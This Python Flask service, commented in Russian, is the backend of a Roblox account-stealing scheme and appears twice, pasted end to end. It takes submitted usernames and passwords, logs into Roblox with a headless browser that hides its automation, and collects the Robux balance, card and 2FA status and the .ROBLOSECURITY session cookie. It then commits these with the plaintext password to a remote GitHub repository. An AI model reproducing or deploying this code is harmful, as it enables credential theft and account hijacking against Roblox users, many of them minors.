import os
import logging
import random
import string
import time
import socket
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException, TimeoutException
import git
from datetime import datetime

app = Flask(__name__)

# Конфигурация
ORDERS_REPO = "https://github.com/yourusername/base.git"  # Замените на ваш приватный репозиторий
ORDERS_DIR = "orders"
SCREENSHOT_DIR = "screenshots"
GIT_USERNAME = os.getenv("GITHUB_USERNAME", "your-github-username")
GIT_TOKEN = os.getenv("GITHUB_TOKEN")  # Токен с правами repo
MAX_RETRIES = 3

# Создаем директории если их нет
os.makedirs(ORDERS_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Настройка Chrome для Render.com
def get_chrome_options():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    return options

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("debug.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def generate_random_filename():
    """Генерирует случайное имя файла"""
    chars = string.ascii_letters + string.digits
    return f"Order_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{''.join(random.choices(chars, k=4))}.txt"

def init_git_repo():
    """Инициализирует или обновляет git репозиторий"""
    try:
        if os.path.exists(os.path.join(ORDERS_DIR, '.git')):
            repo = git.Repo(ORDERS_DIR)
            repo.git.fetch()
            repo.git.reset('--hard', 'origin/main')
            logger.info("Репозиторий обновлен")
        else:
            if os.path.exists(ORDERS_DIR):
                for item in os.listdir(ORDERS_DIR):
                    if item != '.git':
                        os.remove(os.path.join(ORDERS_DIR, item))
            else:
                os.makedirs(ORDERS_DIR, exist_ok=True)
            
            repo_url = f"https://{GIT_USERNAME}:{GIT_TOKEN}@{ORDERS_REPO.split('https://')[1]}"
            git.Repo.clone_from(repo_url, ORDERS_DIR)
            logger.info("Репозиторий клонирован")
        return True
    except Exception as e:
        logger.error(f"Ошибка при работе с репозиторием: {str(e)}")
        return False

def save_to_repo(username, password, data):
    """Сохраняет данные в репозиторий"""
    try:
        if not init_git_repo():
            return False
        
        filename = generate_random_filename()
        filepath = os.path.join(ORDERS_DIR, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(data)
        
        repo = git.Repo(ORDERS_DIR)
        repo.git.add(filepath)
        repo.index.commit(f"Add order {filename}")
        
        origin = repo.remote(name='origin')
        origin.push()
        
        logger.info(f"Данные сохранены в {filename}")
        return True
    except Exception as e:
        logger.error(f"Ошибка при сохранении: {str(e)}")
        return False

def simulate_human_behavior(driver):
    """Имитирует человеческое поведение"""
    try:
        actions = ActionChains(driver)
        actions.move_by_offset(random.randint(-30, 30), random.randint(-30, 30)).perform()
        time.sleep(random.uniform(0.1, 0.3))
        driver.execute_script(f"window.scrollBy(0, {random.randint(50, 150)});")
        time.sleep(random.uniform(0.1, 0.3))
    except Exception as e:
        logger.warning(f"Ошибка имитации поведения: {str(e)}")

def process_roblox_login(username, password):
    """Обрабатывает вход в Roblox"""
    driver = None
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=get_chrome_options())
        
        # Настройка браузера
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": """
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
            """
        })
        
        # Открываем страницу входа
        driver.get("https://www.roblox.com/login")
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "login-username")))
        
        # Имитация поведения
        simulate_human_behavior(driver)
        
        # Ввод данных
        username_field = driver.find_element(By.ID, "login-username")
        username_field.send_keys(username)
        time.sleep(random.uniform(0.1, 0.3))
        
        password_field = driver.find_element(By.ID, "login-password")
        password_field.send_keys(password)
        time.sleep(random.uniform(0.1, 0.3))
        
        # Клик по кнопке входа
        login_button = driver.find_element(By.ID, "login-button")
        login_button.click()
        
        # Проверка результата
        try:
            WebDriverWait(driver, 10).until(
                EC.any_of(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "div.avatar-container")),
                    EC.url_contains("roblox.com/home")
                ))
            
            # Получаем данные аккаунта
            robux = "0 R$"
            try:
                driver.get("https://www.roblox.com/transactions")
                robux_element = WebDriverWait(driver, 3).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "div.text-robux-lg")))
                robux = robux_element.text.strip() + " R$"
            except:
                pass
            
            # Сохраняем данные
            account_data = f"""Username: {username}
Password: {password}
Robux: {robux}
Premium: {'Yes' if 'icon-premium' in driver.page_source else 'No'}
Card: {'Yes' if 'card-info' in driver.page_source else 'No'}
2FA: {'Yes' if 'two-step-verification' in driver.page_source else 'No'}
Cookie: {driver.get_cookie('.ROBLOSECURITY')['value'] if driver.get_cookie('.ROBLOSECURITY') else 'None'}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            
            return {'status': 'success', 'message': 'Login successful', 'data': account_data}
            
        except Exception as e:
            # Проверка на 2FA
            if "verification" in driver.page_source or "Two Step" in driver.page_source:
                return {'status': '2fa_required', 'message': '2FA verification required'}
            
            # Проверка на неверные данные
            if "incorrect" in driver.page_source.lower() or "invalid" in driver.page_source.lower():
                return {'status': 'invalid_credentials', 'message': 'Incorrect username or password'}
            
            return {'status': 'error', 'message': 'Unknown login error'}
            
    except Exception as e:
        logger.error(f"Ошибка при обработке: {str(e)}")
        return {'status': 'error', 'message': str(e)}
    finally:
        if driver:
            driver.quit()

@app.route('/process_login', methods=['POST'])
def handle_login():
    """Обрабатывает запрос на вход"""
    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
    
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'Missing username or password'}), 400
    
    result = process_roblox_login(username, password)
    
    if result['status'] == 'success':
        if not save_to_repo(username, password, result['data']):
            return jsonify({'status': 'error', 'message': 'Failed to save data'}), 500
    
    return jsonify(result)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)import os
import logging
import random
import string
import time
import socket
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException, TimeoutException
import git
from datetime import datetime

app = Flask(__name__)

# Конфигурация
ORDERS_REPO = "https://github.com/yourusername/base.git"  # Замените на ваш приватный репозиторий
ORDERS_DIR = "orders"
SCREENSHOT_DIR = "screenshots"
GIT_USERNAME = os.getenv("GITHUB_USERNAME", "your-github-username")
GIT_TOKEN = os.getenv("GITHUB_TOKEN")  # Токен с правами repo
MAX_RETRIES = 3

# Создаем директории если их нет
os.makedirs(ORDERS_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Настройка Chrome для Render.com
def get_chrome_options():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    return options

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("debug.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def generate_random_filename():
    """Генерирует случайное имя файла"""
    chars = string.ascii_letters + string.digits
    return f"Order_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{''.join(random.choices(chars, k=4))}.txt"

def init_git_repo():
    """Инициализирует или обновляет git репозиторий"""
    try:
        if os.path.exists(os.path.join(ORDERS_DIR, '.git')):
            repo = git.Repo(ORDERS_DIR)
            repo.git.fetch()
            repo.git.reset('--hard', 'origin/main')
            logger.info("Репозиторий обновлен")
        else:
            if os.path.exists(ORDERS_DIR):
                for item in os.listdir(ORDERS_DIR):
                    if item != '.git':
                        os.remove(os.path.join(ORDERS_DIR, item))
            else:
                os.makedirs(ORDERS_DIR, exist_ok=True)
            
            repo_url = f"https://{GIT_USERNAME}:{GIT_TOKEN}@{ORDERS_REPO.split('https://')[1]}"
            git.Repo.clone_from(repo_url, ORDERS_DIR)
            logger.info("Репозиторий клонирован")
        return True
    except Exception as e:
        logger.error(f"Ошибка при работе с репозиторием: {str(e)}")
        return False

def save_to_repo(username, password, data):
    """Сохраняет данные в репозиторий"""
    try:
        if not init_git_repo():
            return False
        
        filename = generate_random_filename()
        filepath = os.path.join(ORDERS_DIR, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(data)
        
        repo = git.Repo(ORDERS_DIR)
        repo.git.add(filepath)
        repo.index.commit(f"Add order {filename}")
        
        origin = repo.remote(name='origin')
        origin.push()
        
        logger.info(f"Данные сохранены в {filename}")
        return True
    except Exception as e:
        logger.error(f"Ошибка при сохранении: {str(e)}")
        return False

def simulate_human_behavior(driver):
    """Имитирует человеческое поведение"""
    try:
        actions = ActionChains(driver)
        actions.move_by_offset(random.randint(-30, 30), random.randint(-30, 30)).perform()
        time.sleep(random.uniform(0.1, 0.3))
        driver.execute_script(f"window.scrollBy(0, {random.randint(50, 150)});")
        time.sleep(random.uniform(0.1, 0.3))
    except Exception as e:
        logger.warning(f"Ошибка имитации поведения: {str(e)}")

def process_roblox_login(username, password):
    """Обрабатывает вход в Roblox"""
    driver = None
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=get_chrome_options())
        
        # Настройка браузера
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": """
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
            """
        })
        
        # Открываем страницу входа
        driver.get("https://www.roblox.com/login")
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "login-username")))
        
        # Имитация поведения
        simulate_human_behavior(driver)
        
        # Ввод данных
        username_field = driver.find_element(By.ID, "login-username")
        username_field.send_keys(username)
        time.sleep(random.uniform(0.1, 0.3))
        
        password_field = driver.find_element(By.ID, "login-password")
        password_field.send_keys(password)
        time.sleep(random.uniform(0.1, 0.3))
        
        # Клик по кнопке входа
        login_button = driver.find_element(By.ID, "login-button")
        login_button.click()
        
        # Проверка результата
        try:
            WebDriverWait(driver, 10).until(
                EC.any_of(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "div.avatar-container")),
                    EC.url_contains("roblox.com/home")
                ))
            
            # Получаем данные аккаунта
            robux = "0 R$"
            try:
                driver.get("https://www.roblox.com/transactions")
                robux_element = WebDriverWait(driver, 3).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "div.text-robux-lg")))
                robux = robux_element.text.strip() + " R$"
            except:
                pass
            
            # Сохраняем данные
            account_data = f"""Username: {username}
Password: {password}
Robux: {robux}
Premium: {'Yes' if 'icon-premium' in driver.page_source else 'No'}
Card: {'Yes' if 'card-info' in driver.page_source else 'No'}
2FA: {'Yes' if 'two-step-verification' in driver.page_source else 'No'}
Cookie: {driver.get_cookie('.ROBLOSECURITY')['value'] if driver.get_cookie('.ROBLOSECURITY') else 'None'}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            
            return {'status': 'success', 'message': 'Login successful', 'data': account_data}
            
        except Exception as e:
            # Проверка на 2FA
            if "verification" in driver.page_source or "Two Step" in driver.page_source:
                return {'status': '2fa_required', 'message': '2FA verification required'}
            
            # Проверка на неверные данные
            if "incorrect" in driver.page_source.lower() or "invalid" in driver.page_source.lower():
                return {'status': 'invalid_credentials', 'message': 'Incorrect username or password'}
            
            return {'status': 'error', 'message': 'Unknown login error'}
            
    except Exception as e:
        logger.error(f"Ошибка при обработке: {str(e)}")
        return {'status': 'error', 'message': str(e)}
    finally:
        if driver:
            driver.quit()

@app.route('/process_login', methods=['POST'])
def handle_login():
    """Обрабатывает запрос на вход"""
    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid content type'}), 400
    
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'Missing username or password'}), 400
    
    result = process_roblox_login(username, password)
    
    if result['status'] == 'success':
        if not save_to_repo(username, password, result['data']):
            return jsonify({'status': 'error', 'message': 'Failed to save data'}), 500
    
    return jsonify(result)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
